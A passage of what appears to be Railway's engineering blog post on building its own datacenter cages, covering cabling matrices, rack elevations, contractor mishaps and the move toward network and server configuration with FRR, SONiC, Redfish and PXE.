https://blog.railway.com/_next/image?url=https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2Fa63b5cbc-d4d5-4113-9555-0919a5dd0f1f%2F47d0feac-bdeb-489f-a20b-3255f7704169%2Frailway-structured-cabling-services.png%3FX-Amz-Algorithm%3DAWS4-HMAC-SHA256%26X-Amz-Content-Sha256%3DUNSIGNED-PAYLOAD%26X-Amz-Credential%3DAKIAT73L2G45FSPPWI6X%252F20250117%252Fus-west-2%252Fs3%252Faws4_request%26X-Amz-Date%3D20250117T233000Z%26X-Amz-Expires%3D3600%26X-Amz-Signature%3Dda26b095aa1a2a9c47cb8032dba4c1bab8d3072962a9c3f8749838942bc755dc%26X-Amz-SignedHeaders%3Dhost%26x-id%3DGetObject&amp;w=1200&amp;q=75 1200w, https://blog.railway.com/_next/image?url=https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2Fa63b5cbc-d4d5-4113-9555-0919a5dd0f1f%2F47d0feac-bdeb-489f-a20b-3255f7704169%2Frailway-structured-cabling-services.png%3FX-Amz-Algorithm%3DAWS4-HMAC-SHA256%26X-Amz-Content-Sha256%3DUNSIGNED-PAYLOAD%26X-Amz-Credential%3DAKIAT73L2G45FSPPWI6X%252F20250117%252Fus-west-2%252Fs3%252Faws4_request%26X-Amz-Date%3D20250117T233000Z%26X-Amz-Expires%3D3600%26X-Amz-Signature%3Dda26b095aa1a2a9c47cb8032dba4c1bab8d3072962a9c3f8749838942bc755dc%26X-Amz-SignedHeaders%3Dhost%26x-id%3DGetObject&amp;w=1920&amp;q=75 1920w, https://blog.railway.com/_next/image?url=https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2Fa63b5cbc-d4d5-4113-9555-0919a5dd0f1f%2F47d0feac-bdeb-489f-a20b-3255f7704169%2Frailway-structured-cabling-services.png%3FX-Amz-Algorithm%3DAWS4-HMAC-SHA256%26X-Amz-Content-Sha256%3DUNSIGNED-PAYLOAD%26X-Amz-Credential%3DAKIAT73L2G45FSPPWI6X%252F20250117%252Fus-west-2%252Fs3%252Faws4_request%26X-Amz-Date%3D20250117T233000Z%26X-Amz-Expires%3D3600%26X-Amz-Signature%3Dda26b095aa1a2a9c47cb8032dba4c1bab8d3072962a9c3f8749838942bc755dc%26X-Amz-SignedHeaders%3Dhost%26x-id%3DGetObject&amp;w=2048&amp;q=75 2048w, https://blog.railway.com/_next/image?url=https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2Fa63b5cbc-d4d5-4113-9555-0919a5dd0f1f%2F47d0feac-bdeb-489f-a20b-3255f7704169%2Frailway-structured-cabling-services.png%3FX-Amz-Algorithm%3DAWS4-HMAC-SHA256%26X-Amz-Content-Sha256%3DUNSIGNED-PAYLOAD%26X-Amz-Credential%3DAKIAT73L2G45FSPPWI6X%252F20250117%252Fus-west-2%252Fs3%252Faws4_request%26X-Amz-Date%3D20250117T233000Z%26X-Amz-Expires%3D3600%26X-Amz-Signature%3Dda26b095aa1a2a9c47cb8032dba4c1bab8d3072962a9c3f8749838942bc755dc%26X-Amz-SignedHeaders%3Dhost%26x-id%3DGetObject&amp;w=3840&amp;q=75 3840w" src="https://blog.railway.com/_next/image?url=https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2Fa63b5cbc-d4d5-4113-9555-0919a5dd0f1f%2F47d0feac-bdeb-489f-a20b-3255f7704169%2Frailway-structured-cabling-services.png%3FX-Amz-Algorithm%3DAWS4-HMAC-SHA256%26X-Amz-Content-Sha256%3DUNSIGNED-PAYLOAD%26X-Amz-Credential%3DAKIAT73L2G45FSPPWI6X%252F20250117%252Fus-west-2%252Fs3%252Faws4_request%26X-Amz-Date%3D20250117T233000Z%26X-Amz-Expires%3D3600%26X-Amz-Signature%3Dda26b095aa1a2a9c47cb8032dba4c1bab8d3072962a9c3f8749838942bc755dc%26X-Amz-SignedHeaders%3Dhost%26x-id%3DGetObject&amp;w=3840&amp;q=75" decoding="async" data-nimg="fill" loading="lazy"></p><p>Our DIY attempts at cabling to get the first server online vs. what our installation partner put together</p></div><p><span>To install it properly, we bring in professionals, but the professionals need to know what to install. A comprehensive documentation pack is essential. A cabling matrix and rack elevation are common documents that communicate to contractors how to rack and wire-up servers.</span></p><p><span>A cabling matrix describes the termination of each cable, specifying the device position and port for each side of the connection, along with the specification of the cable itself (type of fiber, length, etc). The rack elevation is a visual representation of the rack itself, showing the position and orientation of each device.</span></p><div><p><img alt="The cabling matrix for our first install - 300+ cables all manually entered and cross-checked" sizes="100vw" srcset="https://blog.railway.com/_next/image?url=https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2Fa63b5cbc-d4d5-4113-9555-0919a5dd0f1f%2F2ae44065-956d-449c-97b1-7061ec833ab6%2FCleanShot_2025-01-15_at_23.19.412x.png%3FX-Amz-Algorithm%3DAWS4-HMAC-SHA256%26X-Amz-Content-Sha256%3DUNSIGNED-PAYLOAD%26X-Amz-Credential%3DAKIAT73L2G45FSPPWI6X%252F20250117%252Fus-west-2%252Fs3%252Faws4_request%26X-Amz-Date%3D20250117T233000Z%26X-Amz-Expires%3D3600%26X-Amz-Signature%3Df9d5ce5194b7a48093fecfd0b203851ce2c8b57b6b6a8d52785a37fa0f2769e4%26X-Amz-SignedHeaders%3Dhost%26x-id%3DGetObject&amp;w=640&amp;q=75 640w, https://blog.railway.com/_next/image?url=https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2Fa63b5cbc-d4d5-4113-9555-0919a5dd0f1f%2F2ae44065-956d-449c-97b1-7061ec833ab6%2FCleanShot_2025-01-15_at_23.19.412x.png%3FX-Amz-Algorithm%3DAWS4-HMAC-SHA256%26X-Amz-Content-Sha256%3DUNSIGNED-PAYLOAD%26X-Amz-Credential%3DAKIAT73L2G45FSPPWI6X%252F20250117%252Fus-west-2%252Fs3%252Faws4_request%26X-Amz-Date%3D20250117T233000Z%26X-Amz-Expires%3D3600%26X-Amz-Signature%3Df9d5ce5194b7a48093fecfd0b203851ce2c8b57b6b6a8d52785a37fa0f2769e4%26X-Amz-SignedHeaders%3Dhost%26x-id%3DGetObject&amp;w=750&amp;q=75 750w, https://blog.railway.com/_next/image?url=https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2Fa63b5cbc-d4d5-4113-9555-0919a5dd0f1f%2F2ae44065-956d-449c-97b1-7061ec833ab6%2FCleanShot_2025-01-15_at_23.19.412x.png%3FX-Amz-Algorithm%3DAWS4-HMAC-SHA256%26X-Amz-Content-Sha256%3DUNSIGNED-PAYLOAD%26X-Amz-Credential%3DAKIAT73L2G45FSPPWI6X%252F20250117%252Fus-west-2%252Fs3%252Faws4_request%26X-Amz-Date%3D20250117T233000Z%26X-Amz-Expires%3D3600%26X-Amz-Signature%3Df9d5ce5194b7a48093fecfd0b203851ce2c8b57b6b6a8d52785a37fa0f2769e4%26X-Amz-SignedHeaders%3Dhost%26x-id%3DGetObject&amp;w=828&amp;q=75 828w, https://blog.railway.com/_next/image?url=https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2Fa63b5cbc-d4d5-4113-9555-0919a5dd0f1f%2F2ae44065-956d-449c-97b1-7061ec833ab6%2FCleanShot_2025-01-15_at_23.19.412x.png%3FX-Amz-Algorithm%3DAWS4-HMAC-SHA256%26X-Amz-Content-Sha256%3DUNSIGNED-PAYLOAD%26X-Amz-Credential%3DAKIAT73L2G45FSPPWI6X%252F20250117%252Fus-west-2%252Fs3%252Faws4_request%26X-Amz-Date%3D20250117T233000Z%26X-Amz-Expires%3D3600%26X-Amz-Signature%3Df9d5ce5194b7a48093fecfd0b203851ce2c8b57b6b6a8d52785a37fa0f2769e4%26X-Amz-SignedHeaders%3Dhost%26x-id%3DGetObject&amp;w=1080&amp;q=75 1080w, https://blog.railway.com/_next/image?url=https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2Fa63b5cbc-d4d5-4113-9555-0919a5dd0f1f%2F2ae44065-956d-449c-97b1-7061ec833ab6%2FCleanShot_2025-01-15_at_23.19.412x.png%3FX-Amz-Algorithm%3DAWS4-HMAC-SHA256%26X-Amz-Content-Sha256%3DUNSIGNED-PAYLOAD%26X-Amz-Credential%3DAKIAT73L2G45FSPPWI6X%252F20250117%252Fus-west-2%252Fs3%252Faws4_request%26X-Amz-Date%3D20250117T233000Z%26X-Amz-Expires%3D3600%26X-Amz-Signature%3Df9d5ce5194b7a48093fecfd0b203851ce2c8b57b6b6a8d52785a37fa0f2769e4%26X-Amz-SignedHeaders%3Dhost%26x-id%3DGetObject&amp;w=1200&amp;q=75 1200w, https://blog.railway.com/_next/image?url=https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2Fa63b5cbc-d4d5-4113-9555-0919a5dd0f1f%2F2ae44065-956d-449c-97b1-7061ec833ab6%2FCleanShot_2025-01-15_at_23.19.412x.png%3FX-Amz-Algorithm%3DAWS4-HMAC-SHA256%26X-Amz-Content-Sha256%3DUNSIGNED-PAYLOAD%26X-Amz-Credential%3DAKIAT73L2G45FSPPWI6X%252F20250117%252Fus-west-2%252Fs3%252Faws4_request%26X-Amz-Date%3D20250117T233000Z%26X-Amz-Expires%3D3600%26X-Amz-Signature%3Df9d5ce5194b7a48093fecfd0b203851ce2c8b57b6b6a8d52785a37fa0f2769e4%26X-Amz-SignedHeaders%3Dhost%26x-id%3DGetObject&amp;w=1920&amp;q=75 1920w, https://blog.railway.com/_next/image?url=https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2Fa63b5cbc-d4d5-4113-9555-0919a5dd0f1f%2F2ae44065-956d-449c-97b1-7061ec833ab6%2FCleanShot_2025-01-15_at_23.19.412x.png%3FX-Amz-Algorithm%3DAWS4-HMAC-SHA256%26X-Amz-Content-Sha256%3DUNSIGNED-PAYLOAD%26X-Amz-Credential%3DAKIAT73L2G45FSPPWI6X%252F20250117%252Fus-west-2%252Fs3%252Faws4_request%26X-Amz-Date%3D20250117T233000Z%26X-Amz-Expires%3D3600%26X-Amz-Signature%3Df9d5ce5194b7a48093fecfd0b203851ce2c8b57b6b6a8d52785a37fa0f2769e4%26X-Amz-SignedHeaders%3Dhost%26x-id%3DGetObject&amp;w=2048&amp;q=75 2048w, https://blog.railway.com/_next/image?url=https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2Fa63b5cbc-d4d5-4113-9555-0919a5dd0f1f%2F2ae44065-956d-449c-97b1-7061ec833ab6%2FCleanShot_2025-01-15_at_23.19.412x.png%3FX-Amz-Algorithm%3DAWS4-HMAC-SHA256%26X-Amz-Content-Sha256%3DUNSIGNED-PAYLOAD%26X-Amz-Credential%3DAKIAT73L2G45FSPPWI6X%252F20250117%252Fus-west-2%252Fs3%252Faws4_request%26X-Amz-Date%3D20250117T233000Z%26X-Amz-Expires%3D3600%26X-Amz-Signature%3Df9d5ce5194b7a48093fecfd0b203851ce2c8b57b6b6a8d52785a37fa0f2769e4%26X-Amz-SignedHeaders%3Dhost%26x-id%3DGetObject&amp;w=3840&amp;q=75 3840w" src="https://blog.railway.com/_next/image?url=https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2Fa63b5cbc-d4d5-4113-9555-0919a5dd0f1f%2F2ae44065-956d-449c-97b1-7061ec833ab6%2FCleanShot_2025-01-15_at_23.19.412x.png%3FX-Amz-Algorithm%3DAWS4-HMAC-SHA256%26X-Amz-Content-Sha256%3DUNSIGNED-PAYLOAD%26X-Amz-Credential%3DAKIAT73L2G45FSPPWI6X%252F20250117%252Fus-west-2%252Fs3%252Faws4_request%26X-Amz-Date%3D20250117T233000Z%26X-Amz-Expires%3D3600%26X-Amz-Signature%3Df9d5ce5194b7a48093fecfd0b203851ce2c8b57b6b6a8d52785a37fa0f2769e4%26X-Amz-SignedHeaders%3Dhost%26x-id%3DGetObject&amp;w=3840&amp;q=75" decoding="async" data-nimg="fill" loading="lazy"></p><p>The cabling matrix for our first install - 300+ cables all manually entered and cross-checked</p></div><p><span>The documentation exercise can be intense, each of our install phases involved 60+ devices, 300+ discrete cables, and dozens of little details. This was all  handcrafted into written specifications and spreadsheets we used as a basis for the installation and commissioning. From the materials being on site to getting everything installed takes us about 6-14 days.</span></p><div><p><img alt="We have now built internal tooling to automate generating build specifications" sizes="100vw" srcset="https://blog.railway.com/_next/image?url=https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2Fa63b5cbc-d4d5-4113-9555-0919a5dd0f1f%2F32df0987-356a-482b-a9e7-69e8f9bd13cd%2FCleanShot_2025-01-15_at_23.25.012x.png%3FX-Amz-Algorithm%3DAWS4-HMAC-SHA256%26X-Amz-Content-Sha256%3DUNSIGNED-PAYLOAD%26X-Amz-Credential%3DAKIAT73L2G45FSPPWI6X%252F20250117%252Fus-west-2%252Fs3%252Faws4_request%26X-Amz-Date%3D20250117T233000Z%26X-Amz-Expires%3D3600%26X-Amz-Signature%3D452c6f228f5340826c5c9748dd472c11fff266bd5d849ded4e6c78f8e387423c%26X-Amz-SignedHeaders%3Dhost%26x-id%3DGetObject&amp;w=640&amp;q=75 640w, https://blog.railway.com/_next/image?url=https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2Fa63b5cbc-d4d5-4113-9555-0919a5dd0f1f%2F32df0987-356a-482b-a9e7-69e8f9bd13cd%2FCleanShot_2025-01-15_at_23.25.012x.png%3FX-Amz-Algorithm%3DAWS4-HMAC-SHA256%26X-Amz-Content-Sha256%3DUNSIGNED-PAYLOAD%26X-Amz-Credential%3DAKIAT73L2G45FSPPWI6X%252F20250117%252Fus-west-2%252Fs3%252Faws4_request%26X-Amz-Date%3D20250117T233000Z%26X-Amz-Expires%3D3600%26X-Amz-Signature%3D452c6f228f5340826c5c9748dd472c11fff266bd5d849ded4e6c78f8e387423c%26X-Amz-SignedHeaders%3Dhost%26x-id%3DGetObject&amp;w=750&amp;q=75 750w, https://blog.railway.com/_next/image?url=https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2Fa63b5cbc-d4d5-4113-9555-0919a5dd0f1f%2F32df0987-356a-482b-a9e7-69e8f9bd13cd%2FCleanShot_2025-01-15_at_23.25.012x.png%3FX-Amz-Algorithm%3DAWS4-HMAC-SHA256%26X-Amz-Content-Sha256%3DUNSIGNED-PAYLOAD%26X-Amz-Credential%3DAKIAT73L2G45FSPPWI6X%252F20250117%252Fus-west-2%252Fs3%252Faws4_request%26X-Amz-Date%3D20250117T233000Z%26X-Amz-Expires%3D3600%26X-Amz-Signature%3D452c6f228f5340826c5c9748dd472c11fff266bd5d849ded4e6c78f8e387423c%26X-Amz-SignedHeaders%3Dhost%26x-id%3DGetObject&amp;w=828&amp;q=75 828w, https://blog.railway.com/_next/image?url=https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2Fa63b5cbc-d4d5-4113-9555-0919a5dd0f1f%2F32df0987-356a-482b-a9e7-69e8f9bd13cd%2FCleanShot_2025-01-15_at_23.25.012x.png%3FX-Amz-Algorithm%3DAWS4-HMAC-SHA256%26X-Amz-Content-Sha256%3DUNSIGNED-PAYLOAD%26X-Amz-Credential%3DAKIAT73L2G45FSPPWI6X%252F20250117%252Fus-west-2%252Fs3%252Faws4_request%26X-Amz-Date%3D20250117T233000Z%26X-Amz-Expires%3D3600%26X-Amz-Signature%3D452c6f228f5340826c5c9748dd472c11fff266bd5d849ded4e6c78f8e387423c%26X-Amz-SignedHeaders%3Dhost%26x-id%3DGetObject&amp;w=1080&amp;q=75 1080w, https://blog.railway.com/_next/image?url=https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2Fa63b5cbc-d4d5-4113-9555-0919a5dd0f1f%2F32df0987-356a-482b-a9e7-69e8f9bd13cd%2FCleanShot_2025-01-15_at_23.25.012x.png%3FX-Amz-Algorithm%3DAWS4-HMAC-SHA256%26X-Amz-Content-Sha256%3DUNSIGNED-PAYLOAD%26X-Amz-Credential%3DAKIAT73L2G45FSPPWI6X%252F20250117%252Fus-west-2%252Fs3%252Faws4_request%26X-Amz-Date%3D20250117T233000Z%26X-Amz-Expires%3D3600%26X-Amz-Signature%3D452c6f228f5340826c5c9748dd472c11fff266bd5d849ded4e6c78f8e387423c%26X-Amz-SignedHeaders%3Dhost%26x-id%3DGetObject&amp;w=1200&amp;q=75 1200w, https://blog.railway.com/_next/image?url=https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2Fa63b5cbc-d4d5-4113-9555-0919a5dd0f1f%2F32df0987-356a-482b-a9e7-69e8f9bd13cd%2FCleanShot_2025-01-15_at_23.25.012x.png%3FX-Amz-Algorithm%3DAWS4-HMAC-SHA256%26X-Amz-Content-Sha256%3DUNSIGNED-PAYLOAD%26X-Amz-Credential%3DAKIAT73L2G45FSPPWI6X%252F20250117%252Fus-west-2%252Fs3%252Faws4_request%26X-Amz-Date%3D20250117T233000Z%26X-Amz-Expires%3D3600%26X-Amz-Signature%3D452c6f228f5340826c5c9748dd472c11fff266bd5d849ded4e6c78f8e387423c%26X-Amz-SignedHeaders%3Dhost%26x-id%3DGetObject&amp;w=1920&amp;q=75 1920w, https://blog.railway.com/_next/image?url=https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2Fa63b5cbc-d4d5-4113-9555-0919a5dd0f1f%2F32df0987-356a-482b-a9e7-69e8f9bd13cd%2FCleanShot_2025-01-15_at_23.25.012x.png%3FX-Amz-Algorithm%3DAWS4-HMAC-SHA256%26X-Amz-Content-Sha256%3DUNSIGNED-PAYLOAD%26X-Amz-Credential%3DAKIAT73L2G45FSPPWI6X%252F20250117%252Fus-west-2%252Fs3%252Faws4_request%26X-Amz-Date%3D20250117T233000Z%26X-Amz-Expires%3D3600%26X-Amz-Signature%3D452c6f228f5340826c5c9748dd472c11fff266bd5d849ded4e6c78f8e387423c%26X-Amz-SignedHeaders%3Dhost%26x-id%3DGetObject&amp;w=2048&amp;q=75 2048w, https://blog.railway.com/_next/image?url=https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2Fa63b5cbc-d4d5-4113-9555-0919a5dd0f1f%2F32df0987-356a-482b-a9e7-69e8f9bd13cd%2FCleanShot_2025-01-15_at_23.25.012x.png%3FX-Amz-Algorithm%3DAWS4-HMAC-SHA256%26X-Amz-Content-Sha256%3DUNSIGNED-PAYLOAD%26X-Amz-Credential%3DAKIAT73L2G45FSPPWI6X%252F20250117%252Fus-west-2%252Fs3%252Faws4_request%26X-Amz-Date%3D20250117T233000Z%26X-Amz-Expires%3D3600%26X-Amz-Signature%3D452c6f228f5340826c5c9748dd472c11fff266bd5d849ded4e6c78f8e387423c%26X-Amz-SignedHeaders%3Dhost%26x-id%3DGetObject&amp;w=3840&amp;q=75 3840w" src="https://blog.railway.com/_next/image?url=https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2Fa63b5cbc-d4d5-4113-9555-0919a5dd0f1f%2F32df0987-356a-482b-a9e7-69e8f9bd13cd%2FCleanShot_2025-01-15_at_23.25.012x.png%3FX-Amz-Algorithm%3DAWS4-HMAC-SHA256%26X-Amz-Content-Sha256%3DUNSIGNED-PAYLOAD%26X-Amz-Credential%3DAKIAT73L2G45FSPPWI6X%252F20250117%252Fus-west-2%252Fs3%252Faws4_request%26X-Amz-Date%3D20250117T233000Z%26X-Amz-Expires%3D3600%26X-Amz-Signature%3D452c6f228f5340826c5c9748dd472c11fff266bd5d849ded4e6c78f8e387423c%26X-Amz-SignedHeaders%3Dhost%26x-id%3DGetObject&amp;w=3840&amp;q=75" decoding="async" data-nimg="fill" loading="lazy"></p><p>We have now built internal tooling to automate generating build specifications</p></div><p><span>This all seems very far removed from software, DevOps, or what you’d typically think of as “infrastructure,” and that is very true — building a datacenter cage is probably closer to building a house than to deploying a Terraform stack. </span></p><p><span>To compound this, every datacenter facility, contractor and  vendor will do things slightly differently, even within the same organization. The operational aspect requires you to stay on your toes and be extremely detail-oriented. </span></p><p><span>Some what-the-duck moments we’ve had thus far:</span></p><ul><li><span>Contractor: “We need longer power cables” - the PDUs at that site were upside down because the power came in from the floor, so our socket numbering was reversed in the plan</span></li><li><span>Phonecall from Amsterdam: “There’s no demarcation point at the site?” - a specific facility installs external fibre links direct to a box in one of our racks rather than via a dedicated demarcation point overhead</span></li><li><span>Railway Discord quote: “Why are the phases wired so weirdly on this PDU?” - the facility was wired differently to our other sites and the power sockets were wired phase-to-neutral vs. phase-to-phase (WYE vs Delta circuits for you EE’s)</span></li><li><span>Contractor: “Your data cables are too short” - the contractor didn’t realize the network gear was reverse-airflow and tried to mount things the wrong way around</span></li><li><span>Us raising a support ticket: “There’s no link coming up on this cable” - the fiber was wired in the wrong polarity; we learnt what “rolling fibre cables” was that day… it’s when they rip out the plugs from the </span><a href="https://www.fs.com/uk/blog/lc-fiber-optics-a-comprehensive-guide-2684.html" target="_blank" rel="noreferrer noopener"><span>LC connector</span></a><span> and swap them around</span></li><li><span>Railway Discord quote: “I brought a rubber mallet from HomeDepot today” - a batch of nearly 24 PDUs from one vendor were delivered with faulty sockets that didn’t properly engage with the power plugs, even with </span><span>appropriate</span><span> extreme mechanical force being applied</span></li></ul><p><span>But from this point - the hardware is in place the task begins to feel more familiar; we’re now needing to do some BGP, install some OS’es, setup monitoring and bring everything up.</span></p><div><p><img alt="The completed cage ready for configuration" sizes="100vw" srcset="https://blog.railway.com/_next/image?url=https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2Fa63b5cbc-d4d5-4113-9555-0919a5dd0f1f%2F7433fd40-15de-4959-b37a-839c4d39f83e%2Ffinished.jpeg%3FX-Amz-Algorithm%3DAWS4-HMAC-SHA256%26X-Amz-Content-Sha256%3DUNSIGNED-PAYLOAD%26X-Amz-Credential%3DAKIAT73L2G45FSPPWI6X%252F20250117%252Fus-west-2%252Fs3%252Faws4_request%26X-Amz-Date%3D20250117T233000Z%26X-Amz-Expires%3D3600%26X-Amz-Signature%3D08cd10591e1b57b4e105c460317bbd53e6d215e2bd5da2bcc23e9f5c71a75cd8%26X-Amz-SignedHeaders%3Dhost%26x-id%3DGetObject&amp;w=640&amp;q=75 640w, https://blog.railway.com/_next/image?url=https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2Fa63b5cbc-d4d5-4113-9555-0919a5dd0f1f%2F7433fd40-15de-4959-b37a-839c4d39f83e%2Ffinished.jpeg%3FX-Amz-Algorithm%3DAWS4-HMAC-SHA256%26X-Amz-Content-Sha256%3DUNSIGNED-PAYLOAD%26X-Amz-Credential%3DAKIAT73L2G45FSPPWI6X%252F20250117%252Fus-west-2%252Fs3%252Faws4_request%26X-Amz-Date%3D20250117T233000Z%26X-Amz-Expires%3D3600%26X-Amz-Signature%3D08cd10591e1b57b4e105c460317bbd53e6d215e2bd5da2bcc23e9f5c71a75cd8%26X-Amz-SignedHeaders%3Dhost%26x-id%3DGetObject&amp;w=750&amp;q=75 750w, https://blog.railway.com/_next/image?url=https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2Fa63b5cbc-d4d5-4113-9555-0919a5dd0f1f%2F7433fd40-15de-4959-b37a-839c4d39f83e%2Ffinished.jpeg%3FX-Amz-Algorithm%3DAWS4-HMAC-SHA256%26X-Amz-Content-Sha256%3DUNSIGNED-PAYLOAD%26X-Amz-Credential%3DAKIAT73L2G45FSPPWI6X%252F20250117%252Fus-west-2%252Fs3%252Faws4_request%26X-Amz-Date%3D20250117T233000Z%26X-Amz-Expires%3D3600%26X-Amz-Signature%3D08cd10591e1b57b4e105c460317bbd53e6d215e2bd5da2bcc23e9f5c71a75cd8%26X-Amz-SignedHeaders%3Dhost%26x-id%3DGetObject&amp;w=828&amp;q=75 828w, https://blog.railway.com/_next/image?url=https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2Fa63b5cbc-d4d5-4113-9555-0919a5dd0f1f%2F7433fd40-15de-4959-b37a-839c4d39f83e%2Ffinished.jpeg%3FX-Amz-Algorithm%3DAWS4-HMAC-SHA256%26X-Amz-Content-Sha256%3DUNSIGNED-PAYLOAD%26X-Amz-Credential%3DAKIAT73L2G45FSPPWI6X%252F20250117%252Fus-west-2%252Fs3%252Faws4_request%26X-Amz-Date%3D20250117T233000Z%26X-Amz-Expires%3D3600%26X-Amz-Signature%3D08cd10591e1b57b4e105c460317bbd53e6d215e2bd5da2bcc23e9f5c71a75cd8%26X-Amz-SignedHeaders%3Dhost%26x-id%3DGetObject&amp;w=1080&amp;q=75 1080w, https://blog.railway.com/_next/image?url=https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2Fa63b5cbc-d4d5-4113-9555-0919a5dd0f1f%2F7433fd40-15de-4959-b37a-839c4d39f83e%2Ffinished.jpeg%3FX-Amz-Algorithm%3DAWS4-HMAC-SHA256%26X-Amz-Content-Sha256%3DUNSIGNED-PAYLOAD%26X-Amz-Credential%3DAKIAT73L2G45FSPPWI6X%252F20250117%252Fus-west-2%252Fs3%252Faws4_request%26X-Amz-Date%3D20250117T233000Z%26X-Amz-Expires%3D3600%26X-Amz-Signature%3D08cd10591e1b57b4e105c460317bbd53e6d215e2bd5da2bcc23e9f5c71a75cd8%26X-Amz-SignedHeaders%3Dhost%26x-id%3DGetObject&amp;w=1200&amp;q=75 1200w, https://blog.railway.com/_next/image?url=https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2Fa63b5cbc-d4d5-4113-9555-0919a5dd0f1f%2F7433fd40-15de-4959-b37a-839c4d39f83e%2Ffinished.jpeg%3FX-Amz-Algorithm%3DAWS4-HMAC-SHA256%26X-Amz-Content-Sha256%3DUNSIGNED-PAYLOAD%26X-Amz-Credential%3DAKIAT73L2G45FSPPWI6X%252F20250117%252Fus-west-2%252Fs3%252Faws4_request%26X-Amz-Date%3D20250117T233000Z%26X-Amz-Expires%3D3600%26X-Amz-Signature%3D08cd10591e1b57b4e105c460317bbd53e6d215e2bd5da2bcc23e9f5c71a75cd8%26X-Amz-SignedHeaders%3Dhost%26x-id%3DGetObject&amp;w=1920&amp;q=75 1920w, https://blog.railway.com/_next/image?url=https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2Fa63b5cbc-d4d5-4113-9555-0919a5dd0f1f%2F7433fd40-15de-4959-b37a-839c4d39f83e%2Ffinished.jpeg%3FX-Amz-Algorithm%3DAWS4-HMAC-SHA256%26X-Amz-Content-Sha256%3DUNSIGNED-PAYLOAD%26X-Amz-Credential%3DAKIAT73L2G45FSPPWI6X%252F20250117%252Fus-west-2%252Fs3%252Faws4_request%26X-Amz-Date%3D20250117T233000Z%26X-Amz-Expires%3D3600%26X-Amz-Signature%3D08cd10591e1b57b4e105c460317bbd53e6d215e2bd5da2bcc23e9f5c71a75cd8%26X-Amz-SignedHeaders%3Dhost%26x-id%3DGetObject&amp;w=2048&amp;q=75 2048w, https://blog.railway.com/_next/image?url=https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2Fa63b5cbc-d4d5-4113-9555-0919a5dd0f1f%2F7433fd40-15de-4959-b37a-839c4d39f83e%2Ffinished.jpeg%3FX-Amz-Algorithm%3DAWS4-HMAC-SHA256%26X-Amz-Content-Sha256%3DUNSIGNED-PAYLOAD%26X-Amz-Credential%3DAKIAT73L2G45FSPPWI6X%252F20250117%252Fus-west-2%252Fs3%252Faws4_request%26X-Amz-Date%3D20250117T233000Z%26X-Amz-Expires%3D3600%26X-Amz-Signature%3D08cd10591e1b57b4e105c460317bbd53e6d215e2bd5da2bcc23e9f5c71a75cd8%26X-Amz-SignedHeaders%3Dhost%26x-id%3DGetObject&amp;w=3840&amp;q=75 3840w" src="https://blog.railway.com/_next/image?url=https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2Fa63b5cbc-d4d5-4113-9555-0919a5dd0f1f%2F7433fd40-15de-4959-b37a-839c4d39f83e%2Ffinished.jpeg%3FX-Amz-Algorithm%3DAWS4-HMAC-SHA256%26X-Amz-Content-Sha256%3DUNSIGNED-PAYLOAD%26X-Amz-Credential%3DAKIAT73L2G45FSPPWI6X%252F20250117%252Fus-west-2%252Fs3%252Faws4_request%26X-Amz-Date%3D20250117T233000Z%26X-Amz-Expires%3D3600%26X-Amz-Signature%3D08cd10591e1b57b4e105c460317bbd53e6d215e2bd5da2bcc23e9f5c71a75cd8%26X-Amz-SignedHeaders%3Dhost%26x-id%3DGetObject&amp;w=3840&amp;q=75" decoding="async" data-nimg="fill" loading="lazy"></p><p>The completed cage ready for configuration</p></div><p><a href="https://blog.railway.com/p/data-center-build-part-one#pedal-on-metal"><h2><span>Pedal on Metal</span></h2></a></p><p><span>The installed cage is but a blank canvas, the network devices need configuring, router config needs writing, RIR (regional internet registry) records need updating, and we must interact with the likes of </span><a href="https://www.dmtf.org/standards/redfish" target="_blank" rel="noreferrer noopener"><span>Redfish APIs</span></a><span> (HTTP APIs to dedicated controllers on server motherboards and PDUs) and PXE (a protocol to boot servers over the network) to get everything up and running. </span></p><p><span>We've also not discussed how networking works. Our design uses </span><a href="https://frrouting.org/" target="_blank" rel="noreferrer noopener"><span>FRR</span></a><span> and whitebox network switches running </span><a href="https://sonicfoundation.dev/" target="_blank" rel="noreferrer noopener"><span>SONiC</span></a><span> to build a L3-only software-driven network that deeply integrates with our control plane. </span></p><p><span>We’ve regaled you with tales from the frontline … but any more and you’d be here all day. </span></p><p><span>In a future post, we’ll discuss how we go from a bunch of servers in a room to a functional Railway zone. In the space of the last few months we’ve built two new software tools, </span><span>Railyard</span><span> and </span><span>MetalCP</span><span>, to enable a button click experience from designing a new cage, tracing and visualizing the 